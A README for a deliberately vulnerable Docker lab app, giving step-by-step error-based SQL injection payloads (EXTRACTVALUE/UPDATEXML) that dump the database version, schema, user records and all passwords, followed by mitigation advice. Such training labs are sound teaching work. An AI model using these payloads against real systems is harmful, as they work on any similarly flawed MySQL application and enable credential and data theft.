
# Error SQL injection: Setup and Exploitation Guide

This guide provides instructions to set up a vulnerable PHP web application, run it locally using Docker, and exploit SQL injection vulnerabilities to understand how such attacks work in real-world scenarios.
---

## Prerequisites

1. **Docker Installed**: Ensure Docker is installed on your system.
   - Check Docker version:
     
     docker --version
    

Install from docker.com if necessary.

2. **Basic Command Line Knowledge**: Ability to navigate and run commands in the terminal.

---

## Setting Up the Application
### Step 1: Clone the Repository
Clone this repository to your local machine:

git clone https://github.com/christina210490/Error-SQLI.git
cd Error-SQLI

### Step 2: Build and Run the Docker Containers
1. Build the Docker Environment:

docker-compose build

2. Run the Docker Containers:

docker-compose up

3. Access the Application: Open your browser and navigate to:

http://localhost:8081


4. Stop the Application: 

Press Ctrl+C in the terminal running docker-compose or stop it with:

docker-compose down

## Exploiting the SQL Injection Vulnerability


The vulnerable application is set up with a sample database. Below are step-by-step instructions to exploit SQL injection vulnerabilities in this application.


Attack 1: Retrieve MySQL Version

Exploit to find the MySQL version:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, @@version)) -- -


Result: SQL error reveals the MySQL version: 5.7.44.

Attack 2: Retrieve Database Name:

Exploit to find the database name:

http://localhost:8081/user?id=1' AND UPDATEXML(1, CONCAT(0x0a, DATABASE()), 1) -- -
Result: SQL error reveals the database name: testdb.

Attack 3: Retrieve the Number of Tables in the Database

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'testdb'))) -- -

Result: There are 3 tables.

Attack 4: Retrieve Table Names

1. Retrieve all table names in one query:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'testdb'))) -- -

Result: orders,payments,users.

2. Retrieve table names one by one:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' LIMIT 0,1))) -- -

Result: orders

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' LIMIT 1,1))) -- -


Result: payments

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' LIMIT 2,1))) -- -
Result: users

Attack 5: Retrieve Column Information

1. Retrieve the number of columns in the users table:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'testdb'))) -- -

Result: 4.

2. Retrieve column names:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'testdb' LIMIT 0,1))) -- -

Result: id.

Repeat for other columns: name, email, password.

Attack 6: Retrieve User Data

Retrieve rows from the users table:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT CONCAT(id, ':', name, ':', email, ':', password) FROM users LIMIT 0,1))) -- -

Result: 1:Alice:alice@example.com:password1.

Repeat for other rows to retrieve all user data.

Attack 7: Extract All Passwords:

http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT GROUP_CONCAT(password SEPARATOR '') FROM users))) -- -

Result: password1password2password3.

---

# Impact

This application demonstrates the critical risks of SQL injection vulnerabilities, including:

1. Data Theft: Attackers can retrieve sensitive information like user credentials.

2. Database Manipulation: Malicious queries can delete, modify, or insert data.

3. System Exposure: Attackers can gain insights into system configurations.

---

# Mitigation

To prevent SQL injection:

1. Use Prepared Statements:

Avoid directly concatenating user inputs into SQL queries.
Use parameterized queries.

2.Input Validation:

Validate and sanitize all user inputs.
Reject unexpected or dangerous input patterns.

3. Least Privilege:

Restrict database permissions to limit the impact of an exploited vulnerability.

## Key Takeaways

- This app demonstrates the risks of unsanitized user inputs in SQL queries.
- Real-world attackers could exploit such vulnerabilities to steal sensitive data or manipulate the database.
- Always use prepared statements and validate user inputs to prevent SQL injection.

---

## Disclaimer: 

This guide is intended for educational purposes in a controlled environment. Unauthorized testing or exploitation is illegal and may lead to legal consequences.